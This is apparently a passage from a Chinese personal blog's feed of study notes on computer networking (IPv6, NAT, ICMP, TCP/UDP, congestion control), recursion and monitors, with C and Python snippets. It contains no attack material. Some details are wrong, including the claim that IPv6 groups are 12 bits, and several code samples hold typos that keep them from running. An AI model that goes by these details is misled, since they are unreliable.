<h5 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h5><p>用途：表明一个 IP 地址所处子网的子网号。</p>
<p>取值： 32 bits。IP 地址的网络号、子网号全取 1，主机号全取 0。</p>
<p>例：A 网默认子网掩码 255.0.0.0；B 类默认子网掩码 255.255.0.0；C 类默认子网掩码 255.255.255.0；3 位子网号的 B 类子网掩码 255.255.224.0。</p>
<p><strong>“子网地址 + 子网掩码”确定子网大小！</strong></p>
<p>将 IP 分组目的 IP 地址与子网掩码<strong>按位与</strong>运算，得到<strong>子网地址</strong>。</p>
<h4 id="CIDR-Classless-InterDomain-Routing"><a href="#CIDR-Classless-InterDomain-Routing" class="headerlink" title="CIDR(Classless InterDomain Routing)"></a>CIDR(Classless InterDomain Routing)</h4><p>消除传统 A、B、C 类地址界限。网络号与主机号组成网络前缀，前缀可以任意长度。</p>
<p>融合子网地址与子网掩码，方便子网划分。无类地址格式：a.b.c.d/x，x 为前缀长度。</p>
<h4 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h4><p>IPv6 数据报格式：</p>
<ul>
<li>固定长度为 40bytes 的<strong>基本首部</strong></li>
<li>不允许分片</li>
</ul>
<p><img src="https://i.loli.net/2020/01/30/b1QmZhWnNd94vFs.png" alt="IPv6格式"></p>
<ul>
<li>流标签：24bits。表示同一“流”中的数据报。流：源主机到目的主机的所有 IPv6 数据报</li>
<li>载荷长度：16 bits。</li>
<li>下一首部：8bits。指向第一个扩展首部，如果扩展首部不存在则指向传输层报文首部</li>
<li>跳步限制：8bits。报文生存时间</li>
</ul>
<h5 id="IPv6-地址形式"><a href="#IPv6-地址形式" class="headerlink" title="IPv6 地址形式"></a>IPv6 地址形式</h5><p>一共 128 bits。划分为 8 组，每组 12 bits，以 16 进制表示。如：<code>1080:0:0:0:8:800:200C:417A</code>，当中间出现多个连续的 0，可以使用压缩形式：<code>1080::8:800:200C:417A</code>。</p>
<p><strong>IPv6 不再使用掩码！</strong>，统一以 CIDR 形式表示网络大小。</p>
<h5 id="相比-IPv4-的改变"><a href="#相比-IPv4-的改变" class="headerlink" title="相比 IPv4 的改变"></a>相比 IPv4 的改变</h5><ul>
<li><strong>检验和</strong>：彻底移除，每跳处理时间大大减少。</li>
<li><strong>选项</strong>：从基本首部移出变为可选，路由器转发时间减少。</li>
</ul>
<h2 id="DHCP-协议"><a href="#DHCP-协议" class="headerlink" title="DHCP 协议"></a>DHCP 协议</h2><p>主机从 DHCP 服务器动态获取 IP 地址、子网掩码、默认网关、DNS 服务器名称与地址等信息。</p>
<p><img src="https://i.loli.net/2020/01/29/Y1FasAxPQzDW8Id.png" alt="DHCP"></p>
<p>DHCP 协议在<strong>应用层</strong>实现：</p>
<ul>
<li>请求报文封装到 <strong>UDP</strong> 数据报中</li>
<li>IP 广播</li>
<li>链路层广播</li>
</ul>
<h4 id="网络地址转换（NAT）"><a href="#网络地址转换（NAT）" class="headerlink" title="网络地址转换（NAT）"></a>网络地址转换（NAT）</h4><p>多个私有 IP 地址组成的内网通过 NAT 转换成统一的公有 IP 地址与外网通信。</p>
<p>优势：</p>
<ul>
<li>只向 ISP 申请一个 IP 地址</li>
<li>本地设备变更 IP 地址对外网是透明的</li>
<li>变更 ISP 时，无需修改内网设备的 IP 地址</li>
<li>内网设备对外网不可见（安全）</li>
</ul>
<p>实现：</p>
<ul>
<li>替换：利用（NAT IP 地址，新端口号）替换每个<strong>外出 IP 数据报</strong>的（源 IP 地址，源端口号）</li>
<li>记录：将每对（NAT IP 地址，新端口号）与（源 IP 地址，源端口号）的替换信息存储到 <strong>NAT 转换表</strong> 中</li>
<li>替换：根据 NAT 转换表，利用（源 IP 地址，源端口号）替换每个<strong>进入内网 IP 数据报</strong>的（目的 IP 地址，目的端口号），即（NAT IP 地址，新端口号）</li>
</ul>
<p><img src="https://i.loli.net/2020/01/29/ZU9wXMSGixCm1Kf.png" alt="NAT过程"></p>
<p><strong>客户端发送给服务器的 IP 报文，源 IP 不变，目的 IP 随跳跃改变，服务器发送给客户端的 IP 报文，源 IP 随跳跃改变，目的 IP 不变</strong>。</p>
<p>NAT 穿透：</p>
<ul>
<li>端口转发：配置路由器，将外部客户对特定端口的请求转发给特定内部服务器</li>
<li>中继：内、外部客户分别与中继服务器建立连接。中继服务器桥接两个连接的分组（skype、frp 等应用都基于此）<br><img src="https://i.loli.net/2020/01/30/7BtAgQ8hsUYOklC.png" alt="中继"></li>
</ul>
<h2 id="ICMP-协议"><a href="#ICMP-协议" class="headerlink" title="ICMP 协议"></a>ICMP 协议</h2><p>当 IP 数据报传输出错<strong>被丢弃</strong>时，路由器向源主机发送 ICMP 报文。</p>
<p>功能：</p>
<ul>
<li>异常报告</li>
<li>网络探询</li>
</ul>
<p>两类 ICMP 报文：</p>
<ul>
<li>差错报告报文（5 种）：<ul>
<li>目的不可达</li>
<li>源抑制：路由器发现网络拥塞，提示要降低发送速率</li>
<li>超时：TTL 超时</li>
<li>参数错误：路由器发现分组某些字段有问题</li>
<li>重定向：路由器发现这个分组不应该由它转发</li>
</ul>
</li>
<li>网络探询报文（2 种）：<ul>
<li>回声请求与应答报文。ping 基于此</li>
<li>时间戳请求与应答报文：请求获得时间戳</li>
</ul>
</li>
</ul>
<p>ICMP 报文封装到 IP 数据报中传输：<br><img src="https://i.loli.net/2020/01/30/32BVGCpILAkHbdU.png" alt="ICMP格式"></p>
<p>ICMP 报文封装了被丢弃的差错 IP 数据报的首部和前 8bytes 数据（这 8 bytes 通常为 UDP 首部或 TCP 部分首部）：<br><img src="https://i.loli.net/2020/01/30/rIVjqRGvF5Hc1N8.png" alt="ICMP数据部分"></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>网络层</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之传输层</title>
    <url>/2020/01/22/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
    <content><![CDATA[<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>本层将会涉及：</p>
<ul>
<li>复用/分用</li>
<li>可靠数据传输</li>
<li>流量控制</li>
<li>拥塞控制</li>
<li>TCP/UDP</li>
</ul>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>传输层协议为运行在不同 Host 上的<strong>进程</strong>提供了一种逻辑通信机制。所谓逻辑通信，指发送方接收方像是直接通信，下面的协议是透明的。</p>
<p>传输层与网络层不同在于传输层提供进程之间逻辑通信，网络层提供主机之间逻辑通信。</p>
<h2 id="多路复用与多路分用"><a href="#多路复用与多路分用" class="headerlink" title="多路复用与多路分用"></a>多路复用与多路分用</h2><p>某层一个协议直接对应上层多个协议/实体，则需要复用/分用。</p>
<ul>
<li>多路复用：传输层从多个 socket 接收数据，进行头部封装后交给网络层。</li>
<li>多路分用：传输层从网络层接收数据，根据头部信息分发给多个 socket。</li>
</ul>
<h2 id="TCP-UDP-的多路复用分用"><a href="#TCP-UDP-的多路复用分用" class="headerlink" title="TCP/UDP 的多路复用分用"></a>TCP/UDP 的多路复用分用</h2><p>UDP socket 通过<strong>目的端口号</strong>唯一确定，来自不同客户端有相同目的端口的 UDP 报文会被发到相同的服务器 socket 上。</p>
<p>TCP socket 通过<strong>原IP，目的IP， 原端口号，目的端口号</strong>唯一确定，来自不同客户端有相同目的端口的 TCP 报文会被发到不同的服务器 socket 上。</p>
<h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><ul>
<li>复用/分用</li>
<li>错误校验（无纠错）</li>
</ul>
<p>属于<code>无连接</code>协议，提供<code>尽力而为</code>的服务。报文可能丢失，可能非按序到达。</p>
<p><img src="https://i.loli.net/2020/01/23/ubYceGtf5DmOdLH.png" alt="UDP报文格式"></p>
<p>checksum：校验和。负责错误校验。</p>
<p><img src="https://i.loli.net/2020/01/23/AL6TqEfa3YwcnVh.png" alt="计算校验和"></p>
<p><img src="https://i.loli.net/2020/01/23/3qEVYFGcfWjK1I5.png" alt="计算示例"></p>
<h3 id="为什么在传输层做链路检测"><a href="#为什么在传输层做链路检测" class="headerlink" title="为什么在传输层做链路检测"></a>为什么在传输层做链路检测</h3><p>传输层是端到端协议，不能确保这层以下的层次都有错误校验机制。因此需要在离应用层最近的这一层做错误校验。</p>
<h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ul>
<li>延迟低（无连接）。</li>
<li>实现简单（不维护连接状态）。</li>
<li>头部开销少（只需 8bytes，而 TCP 头部需要 20bytes）。</li>
<li>没有拥塞控制，可以控制发送时间和速率。</li>
</ul>
<h2 id="可靠数据传输"><a href="#可靠数据传输" class="headerlink" title="可靠数据传输"></a>可靠数据传输</h2><p>可靠：<strong>不错（带纠错）</strong>，<strong>不丢</strong>，<strong>不乱</strong>。</p>
<h3 id="不错"><a href="#不错" class="headerlink" title="不错"></a>不错</h3><p>利用<strong>校验和</strong>检测位错误。如果有错误，尝试进行恢复。</p>
<h4 id="如何从错误中恢复"><a href="#如何从错误中恢复" class="headerlink" title="如何从错误中恢复"></a>如何从错误中恢复</h4><p><strong>确认（Acknowledgements，ACK）</strong>：接收方显示告知发送方分组已正确接收。</p>
<p><strong>NAK</strong>：接收方显示告知发送方分组错误。</p>
<p>发送方收到 NAK 后，<strong>重传</strong>分组。如果收到的 ACK/NAK 坏掉，<strong>重传</strong>分组。</p>
<h4 id="解决重传分组重复问题"><a href="#解决重传分组重复问题" class="headerlink" title="解决重传分组重复问题"></a>解决重传分组重复问题</h4><p><strong>序列号</strong>：发送方给每个分组增加序列号。接收方丢弃重复分组。</p>
<p>如果接收方用 ACK 告知最后一个正确接收分组的序列号，可以不使用 NAK。</p>
<h3 id="不丢"><a href="#不丢" class="headerlink" title="不丢"></a>不丢</h3><p>发送方等待“<strong>合理</strong>”时间，这个时间内没收到 ACK，<strong>重传</strong>分组。如果这个时间设置过短，依然能正常通信，但是会产生冗余包：</p>
<p><img src="https://i.loli.net/2020/01/23/RbD1VtK29OyFfQW.png" alt="等待时间过短"></p>
<h3 id="提高性能（不乱）"><a href="#提高性能（不乱）" class="headerlink" title="提高性能（不乱）"></a>提高性能（不乱）</h3><p>利用<strong>流水线机制</strong>与<strong>滑动窗口协议</strong>。为了实现流水线机制，我们需要：</p>
<ul>
<li>更大的<strong>序列号范围</strong></li>
<li>更大的存储空间以<strong>缓存分组</strong></li>
</ul>
<h4 id="滑动窗口协议"><a href="#滑动窗口协议" class="headerlink" title="滑动窗口协议"></a>滑动窗口协议</h4><p>窗口：允许使用的序列号范围 N。</p>
<p>滑动窗口：随着协议的运行，窗口在序列号空间内<strong>向前滑动</strong>。</p>
<p><img src="https://i.loli.net/2020/01/23/GAiYTnW2vMxeUoX.png" alt="滑动窗口"></p>
<h5 id="GBN（后退N帧）-协议"><a href="#GBN（后退N帧）-协议" class="headerlink" title="GBN（后退N帧） 协议"></a>GBN（后退N帧） 协议</h5><p>采用<strong>累积确认机制</strong>，ACK(n)：确认到序列号 n（包含n）的分组已被正确接受。为分组设置<strong>定时器</strong>。</p>
<p>超时事件Timeout(n)：重传序列号大于等于 n 的所有未确认分组。</p>
<p>发送方维护两个变量：base and nextseqnum：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextseqnum &lt; base + N) &#123;    <span class="comment">// 如果有窗口内有可用序列号</span></span><br><span class="line">    udt_send(packet[nextseqnum])    <span class="comment">// 发送编号为 nextseqnum 的数据</span></span><br><span class="line">    <span class="keyword">if</span> (base == nextseqnum)</span><br><span class="line">        start_timer;    <span class="comment">// 开始定时器</span></span><br><span class="line">    nextseqnum++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    refuse_data(data);  <span class="comment">// 拒绝发送</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">if</span> timeout <span class="keyword">or</span> <span class="title">corrupt</span><span class="params">(rcvpkt)</span> </span>&#123; <span class="comment">// 如果超时或收到损坏的 ACK</span></span><br><span class="line">        start_timer;    <span class="comment">// 重置定时器</span></span><br><span class="line">        udt_send(data[base])</span><br><span class="line">        ...</span><br><span class="line">        udt_send(data[nextseqnum<span class="number">-1</span>])    <span class="comment">// 重传所有未确认分组</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">if</span> <span class="title">notcorrupt</span><span class="params">(rcvpkt)</span> </span>&#123; <span class="comment">// 如果正常收到 ACK</span></span><br><span class="line">    base = getacknum(rcvpkt) + <span class="number">1</span>;   <span class="comment">// 更新 base，窗口向前滑动！</span></span><br><span class="line">    <span class="keyword">if</span> (base == nextseqnum) <span class="comment">// 所有已发送分组均被正确接收</span></span><br><span class="line">        stop_timer;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        start_timer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接收方值只记住一个变量 expectedseqnum：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> !corrupt(rcvpkt) <span class="function"><span class="keyword">and</span> <span class="title">hasseqnum</span><span class="params">(rcvpkt, expectedseqnum)</span> </span>&#123; <span class="comment">// 如果正确接收分组</span></span><br><span class="line">    data = extract(rcvpkt);</span><br><span class="line">    deliver(data);  <span class="comment">// 向应用层传递数据</span></span><br><span class="line">    udt_send(expectednum, ACK, checksum);   <span class="comment">// 发送 ACK(expectedseqnum)</span></span><br><span class="line">    expectednum++;  <span class="comment">// 更新 expectedseqnum</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    <span class="comment">// 分组损坏 or 乱序到达：直接丢弃</span></span><br><span class="line">    udt_send(expectednum, ACK, checksum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/01/23/tzYge7b6PmEK2CD.png" alt="GBN示例"></p>
<h5 id="SR（选择重传）协议"><a href="#SR（选择重传）协议" class="headerlink" title="SR（选择重传）协议"></a>SR（选择重传）协议</h5><p>接收方对每个分组<strong>单独确认</strong>，设置<strong>缓存机制</strong>，缓存乱序到达分组。发送方只重传没收到 ACK 的分组，为每个分组都设置定时器。</p>
<p>在接收方，我们也设置一个窗口：<br><img src="https://i.loli.net/2020/01/23/tROCeGoPl3svUqp.png" alt="SR发送接收窗口"></p>
<p><img src="https://i.loli.net/2020/01/23/thXiMKGmVSgLpqN.png" alt="SR发送接收分工"></p>
<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>TCP 的可靠数据传输，<strong>既不是 GBN，也不是 SR</strong>！</p>
<ul>
<li>复用/分用</li>
<li>点对点传输</li>
<li>流水线机制</li>
<li>发送方/接收方缓存（SR）</li>
<li>双全工</li>
<li>面向连接</li>
<li>流量控制</li>
</ul>
<p><img src="https://i.loli.net/2020/01/24/wyvrUqoTia52AuN.png" alt="TCP格式"></p>
<p>序列号指 segment 中第一个字节的编号而不是 segment 的编号，建立 TCP 连接时，双方随机选择序列号。</p>
<p>ACKs 指希望收到的下一字节序列号，使用<strong>累计确认</strong>机制（GBN）。</p>
<h3 id="触发重传的事件"><a href="#触发重传的事件" class="headerlink" title="触发重传的事件"></a>触发重传的事件</h3><ul>
<li>超时</li>
<li>收到重复 ACK</li>
</ul>
<p>TCP 只使用<strong>一个计时器</strong>。</p>
<h3 id="设置定时器超时时间"><a href="#设置定时器超时时间" class="headerlink" title="设置定时器超时时间"></a>设置定时器超时时间</h3><p>SampleRTT：从段发出到收到 ACK 用时。</p>
<p>EstimatedRTT：多个 SampleRTT 加权平均值。</p>
<p>超时时间间隔（TimeoutInterval） = EstimatedRTT + 安全边界（DevRTT）</p>
<p><img src="https://i.loli.net/2020/01/24/dYT7Aiw95bBxcKN.png" alt="EstimatedRTT求值"></p>
<p><img src="https://i.loli.net/2020/01/24/HZdy1zDrj56MXFc.png" alt="DevRTT求值"></p>
<p><img src="https://i.loli.net/2020/01/24/EJGCumZoVlyWIpe.png" alt="超时时间间隔求值"></p>
<h3 id="快速重传"><a href="#快速重传" class="headerlink" title="快速重传"></a>快速重传</h3><p>通过检测多个重复的 ACK，发送方确认某个分组已经丢失。快速重传可以在定时器超时之前即进行重传。</p>
<p>如果发送方收到对某一数据的 3 个 ACK，则启动快速重传机制。</p>
<h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><p>本质上，流量控制是一种<strong>速度匹配</strong>机制。</p>
<p>接收方为 TCP 连接分配 Buffer：</p>
<p><img src="https://i.loli.net/2020/01/24/sA8wQaBl3V9PjZI.png" alt="接收方Buffer"></p>
<p>接收方通过在 Segment 头部字段将 RcvWindow 告诉发送方。发送方已发送但未接收 ACK 的数据量不超过 RcvWindow。</p>
<p>RcvWindow = 0，发送方仍然可以发送一个很小的段来更新 RcvWindow 值。</p>
<h3 id="TCP-连接管理"><a href="#TCP-连接管理" class="headerlink" title="TCP 连接管理"></a>TCP 连接管理</h3><p>三次握手：</p>
<ol>
<li>客户端发送 SYN 报文。</li>
<li>服务器发送 SYN/ACK 报文</li>
<li>客户端发送 ACK 报文，此时可以包含数据。</li>
</ol>
<p><img src="https://i.loli.net/2020/01/24/jKaRhulIT8k9D5A.png" alt="三次握手"></p>
<p>四次挥手：</p>
<ol>
<li>客户端发送 FIN 报文</li>
<li>服务器发送 ACK。发送 FIN</li>
<li>客户端收到 FIN，回复 ACK，进入等待状态（确保服务器正确关闭资源）</li>
<li>服务器收到 ACK，连接关闭</li>
</ol>
<p><img src="https://i.loli.net/2020/01/24/PV2D49ulaBKycgo.png" alt="四次挥手"></p>
<h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>与流量控制考虑端到端时延不同，拥塞控制是出于避免发出过多报文导致网络拥塞的考虑。如果说流量控制是小乘佛法，那么拥塞控制就是大乘佛法。</p>
<p>网络层不显式提供拥塞控制支持，端系统通过观察丢失、时延等网络行为判断是否发生拥塞。</p>
<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>发送方设置一个变量 CongWin，动态调整变量以改变发送速率。保证：</p>
<p>LastByteSend - LastByteAcked &lt;= CongWin</p>
<p>rate = CongWin/RTT</p>
<h4 id="如何感知网络拥塞"><a href="#如何感知网络拥塞" class="headerlink" title="如何感知网络拥塞"></a>如何感知网络拥塞</h4><p>发生 Loss 事件（超时或收到 3 个重复 ACK）后，发送方调整速率。</p>
<h4 id="如何调整速率"><a href="#如何调整速率" class="headerlink" title="如何调整速率"></a>如何调整速率</h4><h5 id="加性增-乘性减（拥塞避免）"><a href="#加性增-乘性减（拥塞避免）" class="headerlink" title="加性增-乘性减（拥塞避免）"></a>加性增-乘性减（拥塞避免）</h5><p>逐渐增加发送速率，直到发生 Loss。</p>
<p>方法：AIMD（Additive Increase，Mutiplicative Decrease）：</p>
<ul>
<li>Additive Increase：每个 RTT 将 CongWin 增大一个 MSS（Max Segment Size）</li>
<li>Mutiplicative Decrease：发生 Loss 后将 CongWin 减半</li>
</ul>
<p><img src="https://i.loli.net/2020/01/25/AIB1lpe8UntPEu2.png" alt="AIMD"></p>
<h5 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h5><p>TCP 连接建立时，CongWin = 1。此阶段可用带宽远高于初始速率。</p>
<p>原理：每收到一个 ACK，执行 CongWin++（指数增长，<strong>每次翻倍</strong>）。记录一个变量 Threshold = CongWinSize(Loss)。CongWinSize 超过 Threshold 后由指数增长变为线性增长。</p>
<p><img src="https://i.loli.net/2020/01/25/Sw6VbWrPgDziBFX.png" alt="慢启动"></p>
<p>Loss 处理：</p>
<ul>
<li>3 个重复 ACK：CongWinSize /= 2，然后线性增长</li>
<li>Timeout：CongWinSize = 1，然后指数增长（达到 Threshold 后再线性增长）</li>
</ul>
<p><strong>Timeout 比重复 ACK 更严重！</strong></p>
<ol>
<li>CongWinSize &lt; Threshold，CongWinSize 指数增长</li>
<li>CongWinSize &gt; Threshold，CongWinSize 线性增长</li>
<li>收到 3 个重复 ACK，Threshold = CongWinSize / 2，CongWinSize /= 2（Threshold == CongWinSize）</li>
<li>发生 Timeout，Threshold = CongWinSize / 2，CongWinSize = 1</li>
</ol>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>传输层</tag>
      </tags>
  </entry>
  <entry>
    <title>递归、迭代与回溯</title>
    <url>/2020/01/19/%E9%80%92%E5%BD%92%E3%80%81%E8%BF%AD%E4%BB%A3%E4%B8%8E%E5%9B%9E%E6%BA%AF/</url>
    <content><![CDATA[<h1 id="递归、迭代与回溯"><a href="#递归、迭代与回溯" class="headerlink" title="递归、迭代与回溯"></a>递归、迭代与回溯</h1><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>递归是程序执行过程函数调用自己不断压栈的过程，将一个大问题分解为若干个性质相似的小问题。一个递归模型必须包含两部分： <strong>递归体</strong> 和 <strong>递归出口</strong> 。以求解斐波那契数列为例，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> n  <span class="comment"># 递归出口</span></span><br><span class="line">    <span class="keyword">return</span> Fib(n<span class="number">-1</span>) + Fib(n<span class="number">-2</span>)  <span class="comment"># 递归体</span></span><br></pre></td></tr></table></figure>
<h2 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h2><p>递归深度过大会导致浪费系统资源，同时拖慢程序运行速度。所以，有时候我们需要把递归解法转化为非递归。</p>
<p>对于不需要回溯的问题，可用直接转换法，用中间变量来保存中间结果。这种方法在 <strong>尾递归</strong> 或 <strong>单向递归</strong> 中很常见，还是以斐波那契数列为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">1</span>:</span><br><span class="line">        result = i + j  <span class="comment"># 用中间变量保存迭代结果</span></span><br><span class="line">        i = j</span><br><span class="line">        j = result</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><p>对于不能直接求值，需要回溯的问题，利用栈保存中间结果。例如下面这个逆序输出用户输入的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(“%d”, &amp;x);</span><br><span class="line">    <span class="keyword">if</span> (!x) sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> test(sum);</span><br><span class="line">    sum += x;</span><br><span class="line">    <span class="built_in">printf</span>(“%d”, um);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见这个函数不是简单的单向递归，在递归结束后还要执行一些操作。这就必须用栈来消去递归：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ditui</span><span class="params">(<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack S;</span><br><span class="line">    StackInitiate(&amp;S);</span><br><span class="line">    <span class="keyword">int</span> x, e;</span><br><span class="line">    <span class="built_in">scanf</span>(“%d”, &amp;x) ;</span><br><span class="line">    <span class="keyword">while</span> (x)</span><br><span class="line">    &#123;</span><br><span class="line">        StackPush(&amp;S, x);</span><br><span class="line">        <span class="built_in">scanf</span>(“%d”, &amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    sum=<span class="number">0</span>; </span><br><span class="line">    <span class="built_in">printf</span>(“%d”, sum);</span><br><span class="line">    <span class="keyword">while</span> (StackNotEmpty(S))</span><br><span class="line">    &#123;</span><br><span class="line">        StackPop(&amp;S, &amp;e);</span><br><span class="line">        sum+=e;</span><br><span class="line">        <span class="built_in">printf</span>(“%d”, sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>管程</title>
    <url>/2019/10/13/%E7%AE%A1%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h1><p>管程是一种抽象概念，封装了一个锁、几个条件变量和共享资源。锁保证了某个时刻只有一个线程能进入管程，而条件变量用来控制共享资源。</p>
<h2 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h2><p>每个条件变量表示一种等待原因，对应一个队列，当进程由于共享资源被占用进入等待状态时，我们称其 <code>挂在</code> 某个条件变量上。</p>
<p>条件变量有一个 wait 方法和一个 signal 方法。wait 方法释放当前线程进入管程时获得的锁然后阻塞它。如果有线程挂在这个条件变量上，signal 方法会释放一个队列中的线程，否则 signal 就是一个空操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading improt Event, get_ident</span><br><span class="line"><span class="keyword">from</span> Collections improt deque</span><br><span class="line"></span><br><span class="line">event = Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.waitting_value = <span class="number">0</span>  <span class="comment"># 挂在这个条件变量上的线程数目</span></span><br><span class="line">        self.queue = deque</span><br><span class="line">        <span class="keyword">global</span> event</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(self, lock)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        把当前线程挂在这个条件变量上</span></span><br><span class="line"><span class="string">        :param lock: 管程的锁。同一时刻只有一个线程能获得管程内的资源</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.waitting_value += <span class="number">1</span></span><br><span class="line">        self.queue.append(get_ident())</span><br><span class="line">        print(<span class="string">"Now we are in the thread: &#123;&#125;, executing wait()"</span>.format(get_ident()))</span><br><span class="line">        lock.release()  <span class="comment"># 释放当前线程的lock，让别的线程有机会被执行</span></span><br><span class="line">        event.wait()  <span class="comment"># 阻塞当前线程</span></span><br><span class="line">        lock.acquire()  <span class="comment"># 请求再次进入管程</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signal</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        如果有线程挂在这个条件变量上，signal 选择一个唤醒；如果没有这就是个空操作</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> self.waitting_value &gt; <span class="number">0</span>:</span><br><span class="line">            self.queue.popleft()</span><br><span class="line">            print(<span class="string">"Now we are in the thread: &#123;&#125;, executing signal()"</span>.format(get_ident()))</span><br><span class="line">            event.set()  <span class="comment"># 唤醒一个线程</span></span><br><span class="line">            self.waitting_value -= <span class="number">1</span></span><br><span class="line">            event.clear()</span><br></pre></td></tr></table></figure>
<h2 id="用管程实现生产者-消费者问题"><a href="#用管程实现生产者-消费者问题" class="headerlink" title="用管程实现生产者-消费者问题"></a>用管程实现生产者-消费者问题</h2><p>问题描述：</p>
<ul>
<li>一个或多个生产者产生数据后放在缓冲区里</li>
<li>单个消费者从缓冲区里取出数据处理</li>
<li>任何时刻只有一个生产者或消费者可以访问缓冲区</li>
</ul>
<p>问题分析：</p>
<ul>
<li>任何时刻只能有一个线程操作缓冲区（互斥访问）</li>
<li>缓冲区空时，消费者必须等待生产者（条件同步）</li>
<li>缓冲区满时，生产者必须等待消费者（条件同步）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Event, get_ident, Thread</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">event = Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.wait_value = <span class="number">0</span>  <span class="comment"># 挂在这个条件变量上的线程数目</span></span><br><span class="line">        <span class="keyword">global</span> event</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(self, lock)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        把当前线程挂在这个条件变量上</span></span><br><span 